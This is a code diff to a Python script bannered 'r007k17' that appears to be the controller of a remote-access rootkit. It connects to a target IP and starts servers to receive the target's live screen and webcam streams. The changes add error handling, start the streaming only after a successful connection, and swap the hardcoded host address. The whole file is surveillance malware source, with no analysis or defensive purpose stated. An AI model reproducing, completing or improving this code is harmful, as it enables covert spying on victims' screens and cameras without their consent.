@@ -12,26 +12,30 @@ print("###################################")
 print("##### r007k17 by 7r1574n n13l #####")
 print("###################################")
 
+
 def command(commandToExecute):
     commandToExecute = stopSpaceError(commandToExecute)
     commandToExecuteList = commandToExecute.split()
     global ipToConnect
-    if commandToExecuteList[0] in ("connect", "connexion", "connecter", "co"):
-        if len(commandToExecuteList) > 1 and ("".join(commandToExecuteList[1].split("."))).isdigit() == True:
-            return commandToExecuteList[1]
-        else:
-            print("[ERROR]: no ip requested")
+    try:
+        if commandToExecuteList[0] in ("connect", "connexion", "connecter", "co"):
+            if len(commandToExecuteList) > 1 and ("".join(commandToExecuteList[1].split("."))).isdigit() == True:
+                return commandToExecuteList[1]
+            else:
+                print("[ERROR]: no ip requested")
+                command(input(">"))
+        elif commandToExecute in ("getIp", "Ipget", "getip", "ipget"):
+            getIp()
+        elif commandToExecute in ("listIp", "Iplist", "iplist", "listip"):
+            listIp()
             command(input(">"))
-    elif commandToExecute in ("getIp", "Ipget", "getip", "ipget"):
-        getIp()
-    elif commandToExecute in ("listIp", "Iplist", "iplist", "listip"):
-        listIp()
-        command(input(">"))
-    elif commandToExecute in ("stop"):
-        global progrun
-        progrun = False
-    else:
-        print("Error")
+        elif commandToExecute in ("stop"):
+            global progrun
+            progrun = False
+        else:
+            print("Error")
+            command(input(">"))
+    except:
         command(input(">"))
 
 def sendData(data):
@@ -104,21 +108,21 @@ def creatClient():
     client.settimeout(5)
     try:
         client.connect((ip, port))
+        screen = StreamingServer(ipHost, 22224)
+        t = threading.Thread(target=screen.start_server)
+        t.start()
+        camera = StreamingServer(ipHost, 22225)
+        t = threading.Thread(target=camera.start_server)
+        t.start()
     except:
         run = False
         try:
             print("can't connect to "+ip)
         except:
             print("ip isn't allowed")
-    screen = StreamingServer(ipHost, 22224)
-    t = threading.Thread(target=screen.start_server)
-    t.start()
-    camera = StreamingServer(ipHost, 22225)
-    t = threading.Thread(target=camera.start_server)
-    t.start()
     
 ipToConnect = str()
-ipHost = "192.168.1.48"
+ipHost = "172.17.1.214"
 port = 22228
 
 progrun = True
@@ -134,7 +138,10 @@ while progrun == True:
         except:
             dataToSend = "left"
         sendData(dataToSend)
-    camera.stop_server()
-    screen.stop_server()
+    try:
+        camera.stop_server()
+        screen.stop_server()
+    except:
+        pass
 print("prog stop")
 exit()
